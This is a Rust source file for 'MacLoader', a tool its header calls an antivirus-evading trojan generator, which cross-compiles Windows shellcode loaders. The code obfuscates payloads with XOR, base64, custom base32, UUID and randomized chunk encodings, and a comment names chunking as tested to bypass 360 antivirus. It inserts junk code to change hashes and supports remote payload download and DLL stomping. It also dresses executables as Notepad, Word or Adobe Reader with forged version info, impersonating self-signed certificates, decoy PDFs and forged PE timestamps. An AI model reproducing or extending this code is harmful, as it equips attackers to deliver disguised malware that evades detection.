// MacLoader -- macOS 免杀马生成器 (Tauri + Rust)
// 功能对标 MaLoader: 选 payload -> 选加密/架构/执行方式 -> 交叉编译出 Windows exe

#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]

use serde::{Deserialize, Serialize};
use std::fs;
use std::path::{Path, PathBuf};
use std::process::Command;
use std::time::{SystemTime, UNIX_EPOCH};
use tauri_plugin_dialog::DialogExt;

/// 内置加载器源码 (与本工程 loader.cpp 同源)
const LOADER_SRC: &str = include_str!("../assets/loader.cpp");

/// 图标库 (来自 MaLoader/static, 已打包进二进制)
const LIB_ICONS: &[(&str, &[u8])] = &[
    ("excel",   include_bytes!("../icons/library/excel.ico")),
    ("notepad", include_bytes!("../icons/library/notepad.ico")),
    ("pdf-2",   include_bytes!("../icons/library/pdf-2.ico")),
    ("pdf-3",   include_bytes!("../icons/library/pdf-3.ico")),
    ("pdf",     include_bytes!("../icons/library/pdf.ico")),
    ("ppt",     include_bytes!("../icons/library/ppt.ico")),
    ("word",    include_bytes!("../icons/library/word.ico")),
];

/* ============================ 随机数 ============================ */

/// 有状态 PRNG (xorshift64*): 紧凑循环里也能持续给出不同的值
static RNG_STATE: std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64::new(0);

fn rand_u64() -> u64 {
    use std::sync::atomic::Ordering;
    let mut s = RNG_STATE.load(Ordering::Relaxed);
    if s == 0 {
        // MACLOADER_SEED=<n> 可固定随机序列, 让同一配置两次构建产出逐字节相同。
        // 为什么需要: 默认每次构建都在随机化块数/块长/密钥/垃圾代码, 导致
        // "同一配置"的两次产物哈希不同 —— 于是无法判断某个变体被杀到底是因为
        // 配置项, 还是纯粹运气。做对照实验前必须先固定种子。
        let n = match std::env::var("MACLOADER_SEED") {
            Ok(v) => v.parse::<u64>().unwrap_or(0x9E3779B97F4A7C15),
            Err(_) => SystemTime::now()
                .duration_since(UNIX_EPOCH)
                .map(|d| d.as_nanos() as u64)
                .unwrap_or(0x9E3779B97F4A7C15),
        };
        s = n ^ (std::process::id() as u64).wrapping_mul(0x2545F4914F6CDD1D)
            ^ 0x9E3779B97F4A7C15;
        if std::env::var("MACLOADER_SEED").is_ok() {
            // 固定种子时去掉 pid 熵, 保证真正可复现
            s = n ^ 0x9E3779B97F4A7C15;
        }
    }
    let mut x = s;
    x ^= x >> 12;
    x ^= x << 25;
    x ^= x >> 27;
    RNG_STATE.store(x, Ordering::Relaxed);
    x.wrapping_mul(0x2545F4914F6CDD1D)
}

fn rand_byte() -> u8 {
    ((rand_u64() % 254) + 1) as u8 // 1..=254, 避免 0
}

/* ============================ 图标与资源 ============================ */

/// 版本信息里的字符串: 与所选图标保持一致, 避免"图标是记事本、版本信息写着别的"这种矛盾
fn preset_meta(spec: &str) -> (&'static str, &'static str, &'static str) {
    let n = spec.strip_prefix("lib:").unwrap_or(spec);
    match n {
        "notepad" => ("Microsoft Corporation", "Notepad", "NOTEPAD.EXE"),
        "word"    => ("Microsoft Corporation", "Microsoft Word", "WINWORD.EXE"),
        "excel"   => ("Microsoft Corporation", "Microsoft Excel", "EXCEL.EXE"),
        "ppt"     => ("Microsoft Corporation", "Microsoft PowerPoint", "POWERPNT.EXE"),
        "pdf" | "pdf-2" | "pdf-3" => ("Adobe Inc.", "Adobe Acrobat Reader", "AcroRd32.exe"),
        _ => ("", "Application", "app.exe"),
    }
}

/// 决定最终使用的证书主题: 显式指定优先, 否则按图标预设推导。
fn resolve_subject(opts: &GenOpts) -> String {
    if !opts.cert_subject.trim().is_empty() {
        opts.cert_subject.trim().to_string()
    } else {
        preset_subject(opts.icon.trim())
    }
}

/// 代码签名证书主题: 必须与 VERSIONINFO 的 CompanyName 一致。
///
/// 旧实现的默认值是 "/C=US/O=Document Viewer/CN=Document Viewer", 而默认图标
/// lib:notepad 让 VERSIONINFO 写 CompanyName="Microsoft Corporation" ——
/// 于是同一份 exe 上: 签名者=Document Viewer、版本信息=Microsoft、图标=记事本,
/// 三者互相矛盾, 等于自证"这是伪造的"。现在按图标预设联动。
fn preset_subject(spec: &str) -> String {
    let (company, product, _) = preset_meta(spec);
    if company.is_empty() {
        return d_subj();
    }
    let country = match company {
        "Microsoft Corporation" => "US",
        "Adobe Inc." => "US",
        _ => "US",
    };
    format!("/C={country}/O={company}/CN={product}")
}

/// 通用工具探测: 依次按 PATH 与常见 Homebrew 目录查找
fn find_tool(names: &[&str]) -> Option<String> {
    let extra = ["/opt/homebrew/bin", "/usr/local/bin", "/usr/bin"];
    for n in names {
        if let Ok(p) = which(n) {
            return Some(p);
        }
        for d in extra {
            let p = format!("{d}/{n}");
            if Path::new(&p).exists() {
                return Some(p);
            }
        }
    }
    None
}

fn find_windres(arch: &str) -> Option<String> {
    let names: &[&str] = if arch == "x86" {
        &["i686-w64-mingw32-windres", "x86_64-w64-mingw32-windres"]
    } else {
        &["x86_64-w64-mingw32-windres", "i686-w64-mingw32-windres"]
    };
    find_tool(names)
}

/// 把任意 png/jpg 转成多尺寸 .ico (借 macOS 自带 sips 缩放, 再手工组 ICO 容器)
fn ico_from_image(src: &str, tmp: &Path) -> Result<Vec<u8>, String> {
    let mut pngs: Vec<(u32, Vec<u8>)> = Vec::new();
    for s in [16u32, 32, 48, 64, 128, 256] {
        let dst = tmp.join(format!("s{s}.png"));
        let ok = Command::new("sips")
            .args(["-z", &s.to_string(), &s.to_string(), src, "--out"])
            .arg(&dst)
            .output()
            .map(|o| o.status.success())
            .unwrap_or(false);
        if !ok {
            continue;
        }
        if let Ok(d) = fs::read(&dst) {
            if d.len() > 8 && &d[1..4] == b"PNG" {
                pngs.push((s, d));
            }
        }
    }
    if pngs.is_empty() {
        return Err("图片转换失败（缺 sips 或不支持的格式）".into());
    }
    let n = pngs.len();
    let mut out = Vec::new();
    out.extend_from_slice(&0u16.to_le_bytes());      // reserved
    out.extend_from_slice(&1u16.to_le_bytes());      // type = icon
    out.extend_from_slice(&(n as u16).to_le_bytes());
    let mut off = 6 + 16 * n;
    for (s, d) in &pngs {
        let b = if *s >= 256 { 0u8 } else { *s as u8 };
        out.push(b);
        out.push(b);
        out.push(0);
        out.push(0);
        out.extend_from_slice(&1u16.to_le_bytes());   // planes
        out.extend_from_slice(&32u16.to_le_bytes());  // bpp
        out.extend_from_slice(&(d.len() as u32).to_le_bytes());
        out.extend_from_slice(&(off as u32).to_le_bytes());
        off += d.len();
    }
    for (_, d) in &pngs {
        out.extend_from_slice(d);
    }
    Ok(out)
}

/// 编译资源对象: 图标 / 版本信息 / 应用清单 / 诱饵 PDF
/// full=true 时同时写入 VERSIONINFO 与 RT_MANIFEST, 让 exe 在资源层面像正常程序
fn build_res_obj(
    icon: Option<&str>,
    tmp: &Path,
    arch: &str,
    full: bool,
    decoy: Option<&str>,
) -> Result<PathBuf, String> {
    let mut rc_text = String::new();
    let mut meta_src = String::new();

    if let Some(spec) = icon {
        let ico_bytes: Vec<u8> = if let Some(name) = spec.strip_prefix("lib:") {
            LIB_ICONS
                .iter()
                .find(|(n, _)| *n == name)
                .map(|(_, b)| b.to_vec())
                .ok_or_else(|| format!("图标库中找不到 {name}"))?
        } else {
            let p = Path::new(spec);
            if !p.exists() {
                return Err(format!("图标文件不存在: {spec}"));
            }
            let ext = p
                .extension()
                .map(|e| e.to_string_lossy().to_lowercase())
                .unwrap_or_default();
            if ext == "ico" {
                fs::read(p).map_err(|e| e.to_string())?
            } else {
                ico_from_image(spec, tmp)?
            }
        };
        fs::write(tmp.join("app.ico"), &ico_bytes).map_err(|e| e.to_string())?;
        rc_text.push_str("1 ICON \"app.ico\"\n");
        meta_src = spec.to_string();
    }

    if full {
        let (company, desc, orig) = preset_meta(&meta_src);
        rc_text.push_str(&format!(
            "1 VERSIONINFO\n\
             FILEVERSION 6,1,7601,17514\n\
             PRODUCTVERSION 6,1,7601,17514\n\
             FILEOS 0x40004L\n\
             FILETYPE 0x1L\n\
             BEGIN\n\
             \x20 BLOCK \"StringFileInfo\"\n\
             \x20 BEGIN\n\
             \x20   BLOCK \"040904B0\"\n\
             \x20   BEGIN\n\
             \x20     VALUE \"CompanyName\", \"{company}\"\n\
             \x20     VALUE \"FileDescription\", \"{desc}\"\n\
             \x20     VALUE \"FileVersion\", \"6.1.7601.17514\"\n\
             \x20     VALUE \"InternalName\", \"{orig}\"\n\
             \x20     VALUE \"OriginalFilename\", \"{orig}\"\n\
             \x20     VALUE \"ProductName\", \"{desc}\"\n\
             \x20     VALUE \"ProductVersion\", \"6.1.7601.17514\"\n\
             \x20   END\n\
             \x20 END\n\
             \x20 BLOCK \"VarFileInfo\"\n\
             \x20 BEGIN\n\
             \x20   VALUE \"Translation\", 0x409, 1200\n\
             \x20 END\n\
             END\n"
        ));
        let manifest = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n\
<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\">\n\
<assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.App\" version=\"6.1.7601.17514\" processorArchitecture=\"*\"/>\n\
<trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivileges><requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo>\n\
<dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"*\" publicKeyToken=\"6595b64144ccf1df\" language=\"*\"/></dependentAssembly></dependency>\n\
</assembly>\n";
        fs::write(tmp.join("app.manifest"), manifest).map_err(|e| e.to_string())?;
        rc_text.push_str("1 24 \"app.manifest\"\n");
    }

    // 诱饵 PDF: 作为 RCDATA(id=2) 塞进 .rsrc
    if let Some(d) = decoy {
        let src = Path::new(d);
        if !src.exists() {
            return Err(format!("诱饵 PDF 不存在: {d}"));
        }
        let bytes = fs::read(src).map_err(|e| e.to_string())?;
        if bytes.len() < 5 || &bytes[0..5] != b"%PDF-" {
            return Err("诱饵文件不是合法 PDF（缺少 %PDF- 头）".into());
        }
        fs::write(tmp.join("decoy.pdf"), &bytes).map_err(|e| e.to_string())?;
        rc_text.push_str("2 RCDATA \"decoy.pdf\"\n");
    }

    let rc = tmp.join("app.rc");
    fs::write(&rc, rc_text).map_err(|e| e.to_string())?;

    let wr = find_windres(arch).ok_or("未找到 windres（mingw 资源编译器）")?;
    let obj = tmp.join("app_icon.o");
    let o = Command::new(&wr)
        .current_dir(tmp)
        .args(["app.rc", "-O", "coff", "-o"])
        .arg(&obj)
        .output()
        .map_err(|e| e.to_string())?;
    if !o.status.success() {
        return Err(format!("windres 失败: {}", String::from_utf8_lossy(&o.stderr)));
    }
    Ok(obj)
}

/* ============================ 编码器 ============================ */

fn b64_encode(d: &[u8]) -> String {
    const B: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut out = String::new();
    for c in d.chunks(3) {
        let b0 = c[0] as u32;
        let b1 = *c.get(1).unwrap_or(&0) as u32;
        let b2 = *c.get(2).unwrap_or(&0) as u32;
        let n = (b0 << 16) | (b1 << 8) | b2;
        out.push(B[((n >> 18) & 63) as usize] as char);
        out.push(B[((n >> 12) & 63) as usize] as char);
        out.push(if c.len() > 1 { B[((n >> 6) & 63) as usize] as char } else { '=' });
        out.push(if c.len() > 2 { B[(n & 63) as usize] as char } else { '=' });
    }
    out
}

fn rand_alphabet() -> [u8; 32] {
    let mut a: Vec<u8> = b"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567".to_vec();
    for i in (1..a.len()).rev() {
        let j = (rand_u64() % (i as u64 + 1)) as usize;
        a.swap(i, j);
    }
    let mut out = [0u8; 32];
    out.copy_from_slice(&a);
    out
}

fn b32_encode_custom(d: &[u8], alpha: &[u8; 32]) -> String {
    let mut out = String::new();
    for c in d.chunks(5) {
        let mut buf = [0u8; 5];
        buf[..c.len()].copy_from_slice(c);
        let n = ((buf[0] as u64) << 32)
            | ((buf[1] as u64) << 24)
            | ((buf[2] as u64) << 16)
            | ((buf[3] as u64) << 8)
            | (buf[4] as u64);
        let idx = [
            (n >> 35) & 31, (n >> 30) & 31, (n >> 25) & 31, (n >> 20) & 31,
            (n >> 15) & 31, (n >> 10) & 31, (n >> 5) & 31, n & 31,
        ];
        let keep = match c.len() { 1 => 2, 2 => 4, 3 => 5, 4 => 7, _ => 8 };
        for i in 0..8 {
            if i < keep {
                out.push(alpha[idx[i] as usize] as char);
            } else {
                out.push('=');
            }
        }
    }
    out
}

fn gen_parts_c(name: &str, s: &str) -> String {
    let b = s.as_bytes();
    let mut parts: Vec<String> = Vec::new();
    let mut i = 0usize;
    while i < b.len() {
        let len = 28 + (rand_u64() % 69) as usize;
        let e = (i + len).min(b.len());
        parts.push(s[i..e].to_string());
        i = e;
    }
    let mut out = format!("extern \"C\" const char *{name}[] = {{\n");
    for p in &parts {
        out.push_str(&format!("    \"{p}\",\n"));
    }
    out.push_str("};\n");
    out.push_str(&format!(
        "extern \"C\" const unsigned int {name}_n = {};\n",
        parts.len()
    ));
    out
}

/// 分块方案: 每块 (编码后字节, 块密钥, 是否倒序)。
/// 切分与随机数的消费顺序与旧实现一致, 保证生成形态不变。
struct ChunkPlan {
    enc: Vec<u8>,
    key: u8,
    rev: bool,
}

fn plan_chunks(data: &[u8], allow_rev: bool) -> Vec<ChunkPlan> {
    let k = 3 + (rand_u64() % 5) as usize;
    let mut cuts = vec![0usize];
    for _ in 0..k - 1 {
        let p = *cuts.last().unwrap();
        if p >= data.len() {
            break;
        }
        let remain = data.len() - p;
        let step = 1 + (rand_u64() as usize % remain.max(1));
        cuts.push((p + step).min(data.len()));
    }
    cuts.push(data.len());
    cuts.dedup();

    let mut plans = Vec::new();
    for i in 0..cuts.len() - 1 {
        let seg = &data[cuts[i]..cuts[i + 1]];
        let key = ((rand_u64() % 254) + 1) as u8;
        let rev = allow_rev && (rand_u64() & 1) == 1;
        let mut enc: Vec<u8> = seg.iter().map(|b| b ^ key).collect();
        if rev {
            enc.reverse();
        }
        plans.push(ChunkPlan { enc, key, rev });
    }
    plans
}

fn gen_chunks_c(data: &[u8], allow_rev: bool) -> String {
    let plans = plan_chunks(data, allow_rev);
    let mut src = String::new();
    let mut ptrs = String::new();
    let mut lens = String::new();
    let mut keys = String::new();
    let mut flags = String::new();
    let nchunk = plans.len();
    for (i, p) in plans.iter().enumerate() {
        src.push_str(&format!("static const unsigned char c{i}[] = {{\n"));
        for r in p.enc.chunks(16) {
            let l: Vec<String> = r.iter().map(|b| format!("0x{b:02X}")).collect();
            src.push_str(&format!("    {},\n", l.join(", ")));
        }
        src.push_str("};\n");
        ptrs.push_str(&format!("    c{i},\n"));
        lens.push_str(&format!("    {},\n", p.enc.len()));
        keys.push_str(&format!("    0x{:02X},\n", p.key));
        flags.push_str(&format!("    {},\n", if p.rev { 1 } else { 0 }));
    }
    format!(
        "{src}extern \"C\" const unsigned char *g_chunks[] = {{\n{ptrs}}};\n\
         extern \"C\" const unsigned int g_chunk_lens[] = {{\n{lens}}};\n\
         extern \"C\" const unsigned char g_chunk_keys[] = {{\n{keys}}};\n\
         extern \"C\" const unsigned char g_chunk_flags[] = {{\n{flags}}};\n\
         extern \"C\" const unsigned int g_chunk_n = {nchunk};\n\
         extern \"C\" const unsigned int g_embed_len = {};\n",
        data.len()
    )
}

// [B] 编译期代码随机化: 生成一个垃圾翻译单元
//   N 个随机命名的算术函数 + 构造期调用(确保不被裁掉) + 随机数据块
//   只改变二进制形态与布局, 不参与任何逻辑
fn gen_random_tu() -> String {
    let fns = 4 + (rand_u64() % 9) as usize;
    let mut code = String::new();
    code.push_str("extern \"C\" volatile unsigned long g_junk_sink;\n");

    let mut calls = String::new();
    for _ in 0..fns {
        let nm = format!("jx{:08x}", (rand_u64() & 0xffff_ffff) as u32);
        let seed = rand_u64();
        let a = (rand_u64() as u32) | 1;
        let b = (rand_u64() as u32) | 1;
        let rounds = 3 + (rand_u64() % 10) as u32;
        code.push_str(&format!(
            "static unsigned long {nm}(unsigned long x) {{\n    unsigned long v = x ^ 0x{seed:016x}UL;\n    for (unsigned k = 0; k < {rounds}u; k++) {{\n        v = (v * 0x{a:08x}u) + 0x{b:08x}u;\n        v ^= (v >> 13) ^ (v << 7);\n    }}\n    return v;\n}}\n"
        ));
        calls.push_str(&format!("    s = {nm}(s);\n"));
    }

    let dn = 256 + (rand_u64() % 2048) as usize;
    code.push_str("extern \"C\" const unsigned char g_junk_data[] = {\n");
    for _ in 0..(dn / 16) {
        let l: Vec<String> = (0..16)
            .map(|_| format!("0x{:02X}", (rand_u64() & 0xff) as u8))
            .collect();
        code.push_str(&format!("    {},\n", l.join(", ")));
    }
    code.push_str("};\n");
    code.push_str(&format!(
        "extern \"C\" volatile unsigned long g_junk_sink = 0;\nstruct JInit {{ JInit() {{\n    unsigned long s = 0x{:016x}UL;\n{calls}    for (unsigned i = 0; i < {dn}u; i++) s += g_junk_data[i];\n    g_junk_sink = s;\n}} }};\nstatic JInit g_jinit;\n",
        rand_u64()
    ));
    code
}

fn to_uuids(data: &[u8]) -> Vec<String> {
    let pad = (16 - data.len() % 16) % 16;
    let mut body = data.to_vec();
    body.extend(std::iter::repeat(0u8).take(pad));
    body.chunks(16)
        .map(|b| {
            let hi: String = b[10..16].iter().map(|x| format!("{x:02x}")).collect();
            format!(
                "{:02x}{:02x}{:02x}{:02x}-{:02x}{:02x}-{:02x}{:02x}-{:02x}{:02x}-{}",
                b[3], b[2], b[1], b[0], b[5], b[4], b[7], b[6], b[8], b[9], hi
            )
        })
        .collect()
}

/// 踩踏目标 DLL 的声明
fn stomp_decl(dll: Option<&str>) -> String {
    match dll {
        Some(d) => {
            let esc = d.replace('\\', "\\\\").replace('"', "\\\"");
            format!("extern \"C\" const char *g_stomp_dll = \"{esc}\";\n")
        }
        None => String::new(),
    }
}

/// 按编码形态生成内嵌源码, 返回 (源码, 编译宏名)
fn gen_payload_src(data: &[u8], key: u8, enc: &str, stomp: Option<&str>) -> (String, String) {
    let sx: Vec<u8> = if key != 0 {
        data.iter().map(|b| b ^ key).collect()
    } else {
        data.to_vec()
    };
    let mut out = String::new();
    let def: String;

    match enc {
        // Base64: XOR 后转 base64, 再切成随机长度的小段(不留长连续串)
        "b64" => {
            let s = b64_encode(&sx);
            out.push_str(&gen_parts_c("g_parts", &s));
            out.push_str(&format!(
                "extern \"C\" const unsigned int g_embed_len = {};\n\
                 extern \"C\" const unsigned char g_embed_key = 0x{key:02X};\n",
                data.len()
            ));
            def = "ENC_B64".into();
        }
        // Base32: 自定义乱序字母表
        "b32" => {
            let alpha = rand_alphabet();
            let s = b32_encode_custom(&sx, &alpha);
            out.push_str(&gen_parts_c("g_parts", &s));
            let a: String = alpha.iter().map(|c| *c as char).collect();
            out.push_str(&format!(
                "extern \"C\" const char g_b32_alpha[33] = \"{a}\";\n\
                 extern \"C\" const unsigned int g_embed_len = {};\n\
                 extern \"C\" const unsigned char g_embed_key = 0x{key:02X};\n",
                data.len()
            ));
            def = "ENC_B32".into();
        }
        // 分块: 明文直接切块, 每块独立密钥(无外层 key) —— 实测唯一能过 360 的形态
        "chunk" => {
            out.push_str(&gen_chunks_c(data, false));
            def = "ENC_CHUNK".into();
        }
        // 分块强化: 部分块随机倒序存放, 进一步打乱字节布局
        "chunk_r" => {
            out.push_str(&gen_chunks_c(data, true));
            def = "ENC_CHUNK".into();
        }
        // 明文 hex 数组(不推荐)
        "raw" => {
            let mut rows = Vec::new();
            for chunk in sx.chunks(16) {
                let line: Vec<String> = chunk.iter().map(|b| format!("0x{b:02X}")).collect();
                rows.push(format!("    {}", line.join(", ")));
            }
            out.push_str(&format!(
                "extern \"C\" const unsigned char g_embed_data[] = {{\n{}\n}};\n\
                 extern \"C\" const unsigned int g_embed_len = {};\n\
                 extern \"C\" const unsigned char g_embed_key = 0x{key:02X};\n",
                rows.join(",\n"),
                data.len()
            ));
            def = "ENC_RAW".into();
        }
        // UUID(默认, 与已验证版本一致)
        _ => {
            let uuids = to_uuids(&sx);
            let body: Vec<String> = uuids.iter().map(|u| format!("    \"{u}\"")).collect();
            out.push_str(&format!(
                "extern \"C\" const char *g_embed_uuids[] = {{\n{}\n}};\n\
                 extern \"C\" const unsigned int g_embed_uuid_count = {};\n\
                 extern \"C\" const unsigned int g_embed_uuid_len = {};\n\
                 extern \"C\" const unsigned char g_embed_key = 0x{key:02X};\n",
                body.join(",\n"),
                uuids.len(),
                data.len()
            ));
            def = "ENC_UUID".into();
        }
    }
    out.push_str(&stomp_decl(stomp));
    (out, def)
}

/// 远程版: exe 内只放 URL + 密钥, 载荷运行时下载
fn gen_remote_src(url: &str, key: u8, stomp: Option<&str>) -> String {
    let esc: String = url.replace('\\', "\\\\").replace('"', "\\\"");
    format!(
        "extern \"C\" const char *g_remote_url = \"{esc}\";\n\
         extern \"C\" const unsigned char g_embed_key = 0x{key:02X};\n{}",
        stomp_decl(stomp)
    )
}

/* ============================ PE 时间戳伪造 ============================ */

/// 公历 -> 距 1970-01-01 的天数 (Howard Hinnant 算法)
fn days_from_civil(y: i64, m: i64, d: i64) -> i64 {
    let y = if m <= 2 { y - 1 } else { y };
    let era = if y >= 0 { y } else { y - 399 } / 400;
    let yoe = y - era * 400;
    let mp = if m > 2 { m - 3 } else { m + 9 };
    let doy = (153 * mp + 2) / 5 + d - 1;
    let doe = yoe * 365 + yoe / 4 - yoe / 100 + doy;
    era * 146097 + doe - 719468
}

/// 解析 "YYYY-MM-DDTHH:MM" / "YYYY-MM-DD HH:MM" / "YYYY-MM-DD" -> unix 秒
fn parse_datetime(s: &str) -> Option<i64> {
    let s = s.trim();
    if s.is_empty() {
        return None;
    }
    let (date, time) = s
        .split_once('T')
        .or_else(|| s.split_once(' '))
        .unwrap_or((s, "00:00"));
    let mut dp = date.split('-');
    let y: i64 = dp.next()?.parse().ok()?;
    let mo: i64 = dp.next()?.parse().ok()?;
    let d: i64 = dp.next()?.parse().ok()?;
    if !(1..=12).contains(&mo) || !(1..=31).contains(&d) {
        return None;
    }
    let mut tp = time.split(':');
    let hh: i64 = tp.next().unwrap_or("0").trim().parse().ok()?;
    let mi: i64 = tp.next().unwrap_or("0").trim().parse().ok()?;
    Some(days_from_civil(y, mo, d) * 86400 + hh * 3600 + mi * 60)
}

/// unix 秒 -> "YYYY-MM-DD HH:MM:SS UTC"
fn fmt_ts(ts: i64) -> String {
    let days = ts.div_euclid(86400);
    let secs = ts.rem_euclid(86400);
    let z = days + 719468;
    let era = if z >= 0 { z } else { z - 146096 } / 146097;
    let doe = z - era * 146097;
    let yoe = (doe - doe / 1460 + doe / 36524 - doe / 146096) / 365;
    let y = yoe + era * 400;
    let doy = doe - (365 * yoe + yoe / 4 - yoe / 100);
    let mp = (5 * doy + 2) / 153;
    let d = doy - (153 * mp + 2) / 5 + 1;
    let m = if mp < 10 { mp + 3 } else { mp - 9 };
    let y = if m <= 2 { y + 1 } else { y };
    format!(
        "{:04}-{:02}-{:02} {:02}:{:02}:{:02} UTC",
        y, m, d, secs / 3600, (secs % 3600) / 60, secs % 60
    )
}

/// 改写 PE 头 TimeDateStamp + Debug Directory 里的时间戳
fn patch_pe_timestamp(path: &Path, ts: u32) -> Result<usize, String> {
    let mut d = fs::read(path).map_err(|e| e.to_string())?;
    if d.len() < 0x40 {
        return Err("文件过小".into());
    }
    let e = u32::from_le_bytes([d[0x3c], d[0x3d], d[0x3e], d[0x3f]]) as usize;
    if e + 0x18 + 0x80 > d.len() {
        return Err("PE 头越界".into());
    }
    // IMAGE_FILE_HEADER.TimeDateStamp
    d[e + 8..e + 12].copy_from_slice(&ts.to_le_bytes());
    let mut patched = 1usize;

    let magic = u16::from_le_bytes([d[e + 0x18], d[e + 0x19]]);
    let dd = e + 0x18 + if magic == 0x20b { 0x70 } else { 0x60 };
    let dbg = dd + 6 * 8; // DataDirectory[6] = DEBUG
    if dbg + 8 > d.len() {
        fs::write(path, d).map_err(|x| x.to_string())?;
        return Ok(patched);
    }
    let rva = u32::from_le_bytes([d[dbg], d[dbg + 1], d[dbg + 2], d[dbg + 3]]) as usize;
    let size = u32::from_le_bytes([d[dbg + 4], d[dbg + 5], d[dbg + 6], d[dbg + 7]]) as usize;
    if rva == 0 || size < 28 {
        fs::write(path, d).map_err(|x| x.to_string())?;
        return Ok(patched);
    }
    // RVA -> 文件偏移
    let nsec = u16::from_le_bytes([d[e + 6], d[e + 7]]) as usize;
    let opt_size = u16::from_le_bytes([d[e + 0x14], d[e + 0x15]]) as usize;
    let sh = e + 0x18 + opt_size;
    for i in 0..nsec {
        let s = sh + i * 40;
        if s + 40 > d.len() {
            break;
        }
        let vsz = u32::from_le_bytes([d[s + 8], d[s + 9], d[s + 10], d[s + 11]]) as usize;
        let va = u32::from_le_bytes([d[s + 12], d[s + 13], d[s + 14], d[s + 15]]) as usize;
        let rsz = u32::from_le_bytes([d[s + 16], d[s + 17], d[s + 18], d[s + 19]]) as usize;
        let praw = u32::from_le_bytes([d[s + 20], d[s + 21], d[s + 22], d[s + 23]]) as usize;
        let span = vsz.max(rsz);
        if rva >= va && rva < va + span {
            let foff = praw + (rva - va);
            let end = (foff + size).min(d.len());
            let mut p = foff;
            while p + 28 <= end {
                d[p + 4..p + 8].copy_from_slice(&ts.to_le_bytes()); // IMAGE_DEBUG_DIRECTORY.TimeDateStamp
                patched += 1;
                p += 28;
            }
            break;
        }
    }
    fs::write(path, d).map_err(|x| x.to_string())?;
    Ok(patched)
}

/// 设置文件 mtime/atime
fn set_file_time(path: &Path, ts: i64) -> Result<(), String> {
    use std::fs::{File, FileTimes};
    use std::time::Duration;
    let f = File::options().write(true).open(path).map_err(|e| e.to_string())?;
    let t = SystemTime::UNIX_EPOCH + Duration::from_secs(ts.max(0) as u64);
    f.set_times(FileTimes::new().set_modified(t).set_accessed(t))
        .map_err(|e| e.to_string())
}

/* ======================== 代码签名 (Authenticode) ======================== */

/// 证书缓存位置: $HOME/.macloader/
fn cert_dir() -> PathBuf {
    let home = std::env::var("HOME").unwrap_or_else(|_| ".".into());
    PathBuf::from(home).join(".macloader")
}

fn find_openssl() -> Option<String> {
    for p in ["/opt/homebrew/opt/openssl@3/bin/openssl", "/usr/local/opt/openssl@3/bin/openssl"] {
        if Path::new(p).exists() {
            return Some(p.into());
        }
    }
    which("openssl").ok()
}

/// 确保存在自签代码签名证书 + PFX, 返回 (pfx 路径, 密码)
fn ensure_cert(subject: &str) -> Result<(PathBuf, String), String> {
    let dir = cert_dir();
    fs::create_dir_all(&dir).map_err(|e| e.to_string())?;
    let pfx = dir.join("codesign.pfx");
    let key = dir.join("codesign.key");
    let crt = dir.join("codesign.crt");
    let pass = "macloader".to_string();

    if pfx.exists() {
        return Ok((pfx, pass));
    }
    let ossl = find_openssl().ok_or("未找到 openssl")?;

    // OpenSSL 3 要求 -subj 用 "/CN=.." 形式; 这里把逗号形式自动转过来
    let mut subj = subject.trim().to_string();
    if subj.is_empty() {
        subj = d_subj(); // 兜底: 调用方应已通过 resolve_subject 推导过
    }
    if !subj.starts_with('/') {
        subj = subj
            .split(',')
            .map(|s| s.trim())
            .filter(|s| !s.is_empty())
            .map(|s| format!("/{s}"))
            .collect();
    }
    let _ = fs::remove_file(&key);
    let _ = fs::remove_file(&crt);

    let o = Command::new(&ossl)
        .args([
            "req", "-x509", "-newkey", "rsa:2048", "-nodes",
            "-keyout", key.to_str().unwrap_or("k.pem"),
            "-out", crt.to_str().unwrap_or("c.pem"),
            "-days", "3650", "-subj", &subj,
            "-addext", "keyUsage=critical,digitalSignature",
            "-addext", "extendedKeyUsage=codeSigning",
            "-addext", "basicConstraints=critical,CA:FALSE",
        ])
        .output()
        .map_err(|e| e.to_string())?;
    if !o.status.success() {
        let msg = String::from_utf8_lossy(&o.stderr);
        let real: Vec<&str> = msg
            .lines()
            .filter(|l| {
                !l.is_empty() && !l.starts_with('.') && !l.starts_with('+') && !l.starts_with('*')
            })
            .collect();
        return Err(format!("证书生成失败: {}", real.join(" | ")));
    }
    let o = Command::new(&ossl)
        .args([
            "pkcs12", "-export", "-out", pfx.to_str().unwrap_or("c.pfx"),
            "-inkey", key.to_str().unwrap_or("k.pem"),
            "-in", crt.to_str().unwrap_or("c.pem"),
            "-passout", &format!("pass:{pass}"),
        ])
        .output()
        .map_err(|e| e.to_string())?;
    if !o.status.success() {
        return Err(format!("PFX 打包失败: {}", String::from_utf8_lossy(&o.stderr)));
    }
    Ok((pfx, pass))
}

/// 用 osslsigncode 签名; tsa 为空则不打时间戳
fn sign_exe(path: &Path, pfx: &Path, pass: &str, name: &str, tsa: &str) -> Result<(), String> {
    let osslsc = which("osslsigncode").map_err(|_| "未找到 osslsigncode".to_string())?;
    let signed = path.with_extension("signed.exe");
    let _ = fs::remove_file(&signed);

    let mut c = Command::new(&osslsc);
    c.args(["sign", "-pkcs12"])
        .arg(pfx)
        .args(["-pass", pass, "-n", name, "-h", "sha256"]);
    if !tsa.trim().is_empty() {
        c.args(["-ts", tsa.trim()]);
    }
    c.arg("-in").arg(path).arg("-out").arg(&signed);
    let o = c.output().map_err(|e| e.to_string())?;
    if !o.status.success() || !signed.exists() {
        let _ = fs::remove_file(&signed);
        return Err(format!("签名失败: {}", String::from_utf8_lossy(&o.stderr)));
    }
    fs::copy(&signed, path).map_err(|e| e.to_string())?;
    let _ = fs::remove_file(&signed);
    Ok(())
}

/* ============================ payload 解析 ============================ */

fn looks_text(b: &[u8]) -> bool {
    let s = &b[..b.len().min(512)];
    if s.is_empty() {
        return false;
    }
    let ok = s
        .iter()
        .filter(|&&c| c == b'\n' || c == b'\t' || (32..127).contains(&c))
        .count();
    ok * 100 / s.len() > 90
}

